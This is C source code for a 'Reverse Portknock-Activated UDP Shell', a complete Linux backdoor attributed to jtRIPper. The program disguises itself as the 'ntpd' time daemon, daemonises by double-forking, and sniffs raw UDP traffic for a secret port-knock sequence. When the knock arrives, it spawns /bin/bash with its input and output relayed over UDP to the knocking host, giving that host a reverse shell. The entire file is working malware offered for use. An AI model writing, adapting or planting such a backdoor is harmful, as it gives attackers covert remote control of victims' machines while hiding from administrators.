/*
* Reverse Portknock-Activated UDP Shell
* (C) 2013 jtRIPper
*
* This program is free software; you can redistribute it and/or modify
* it under the terms of the GNU General Public License as published by
* the Free Software Foundation; either version 1, or (at your option)
* any later version.
*
* This program is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
* GNU General Public License for more details.
*
* You should have received a copy of the GNU General Public License
* along with this program; if not, write to the Free Software
* Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
*/

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <string.h>
#include <sys/prctl.h>
#include <signal.h>
#include <sys/wait.h>

#define NAME_SPOOF       "ntpd"

int knock_sequence[]      = { 4572, 1337, 8928, 29430 };
int knock_sequence_length = 4;
int cpid                  = 0;

struct port_knock {
  int hits;
  int last_hit;
  in_addr_t last_ip;
};

void error(char *e) {
  perror(e);
  exit(1);
}

void reaper_handle (int sig) {
  while (waitpid(-1, NULL, WNOHANG) > 0) { };
  cpid = 0;
}

void child_handle (int sig) {
  if (sig == SIGCHLD) {
    while (waitpid(-1, NULL, WNOHANG) > 0) { };
    exit(0);
  } else {
    kill(cpid, 9);
    exit(0);
  }
}

int start_binbash(int *infp, int *outfp) {
  char *cmd[] = { NAME_SPOOF,  NULL };
  int p_stdin[2], p_stdout[2];

  pipe(p_stdin);
  pipe(p_stdout);

  if ((cpid = fork()) == 0) {
    close(p_stdin[1]);
    dup2(p_stdin[0], 0);

    close(p_stdout[0]);
    dup2(p_stdout[1], 1);
    dup2(p_stdout[1], 2);
    execv("/bin/bash", cmd);
    exit(0);
  }

  *infp = p_stdin[1];
  *outfp = p_stdout[0];

  return;
}

int udp_connect(in_addr_t target, unsigned int target_port) {
  char buffer[10000];
  fd_set fds, master;
  int sock, len, infd, outfd;
  struct sockaddr_in server;
  struct sigaction child;

  child.sa_handler = child_handle;
  sigaction(SIGUSR1, &child, 0);
  sigaction(SIGCHLD, &child, 0);

  memset(buffer, 0, 10000);

  server.sin_family = AF_INET;
  server.sin_port = target_port;
  server.sin_addr.s_addr = target;

  if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0)
    error("Error:");

  sendto(sock, buffer, 1, 0, (struct sockaddr *)&server, sizeof(struct sockaddr));
  start_binbash(&infd, &outfd);

  FD_ZERO(&fds);
  FD_ZERO(&master);
  FD_SET(sock, &master);
  FD_SET(outfd, &master);
 
  for (;;) {
    fds = master;
    select(outfd+1, &fds, NULL, NULL, NULL);

    memset(buffer, 0, 10000);

    if(FD_ISSET(sock, &fds)) {
      len = recvfrom(sock, buffer, 10000, 0, NULL, NULL);
      write(infd, buffer, len);
    }

    else if(FD_ISSET(outfd, &fds)) {
      len = read(outfd, buffer, 10000);
      sendto(sock, buffer, len, 0, (struct sockaddr *)&server, sizeof(struct sockaddr));
    }
  }

  return;  
}

void portknock(const unsigned char *packet, struct port_knock *knockd) {
  struct iphdr *ip_header = (struct iphdr*)packet;
  struct udphdr *udp_header = (struct udphdr*)(packet + ip_header->ihl * 4);

  if (!knockd->last_ip && ntohs(udp_header->dest) == knock_sequence[0])
    knockd->last_ip = ip_header->saddr;

  if (ip_header->saddr != knockd->last_ip || (knockd->hits != knock_sequence_length && ntohs(udp_header->dest) != knock_sequence[knockd->hits]))
    return;

  if (knockd->hits != 0 && time(NULL) - knockd->last_hit > 10) {
    memset(knockd, 0, sizeof(struct port_knock));
    return;
  }
 
  if (knockd->hits != knock_sequence_length) {
    knockd->last_hit = time(NULL);
    knockd->hits++;
    return;
  }

  if (cpid != 0) 
    kill(cpid, SIGUSR1);

  if ((cpid = fork()) == 0) {
    udp_connect(knockd->last_ip, udp_header->dest);
    exit(0);
  }

  memset(knockd, 0, sizeof(struct port_knock));
}

int main(int argc, char *argv[]) {
  int sniffer, sockaddr_size = sizeof(struct sockaddr);
  unsigned char *buffer = (unsigned char *)malloc(65536);
  struct sockaddr saddr;
  struct sigaction reaper;
  struct port_knock knockd;

  strncpy(argv[0], NAME_SPOOF, strlen(argv[0]));
  prctl(PR_SET_NAME, (unsigned long)NAME_SPOOF, 0, 0, 0);

  reaper.sa_handler = reaper_handle;
  sigaction(SIGCHLD, &reaper, 0);

  if((sniffer = socket(AF_INET , SOCK_RAW , IPPROTO_UDP)) < 0)
    error("Socket:");
 
  memset(&knockd, 0, sizeof(struct port_knock));

  if(fork() != 0) { exit(0); }
  if(fork() != 0) { exit(0); }

  while (1) {
    if(recvfrom(sniffer, buffer, 65536, 0, &saddr, &sockaddr_size) < 1)
      continue;
    portknock(buffer, &knockd);
  }

  return 0;
}
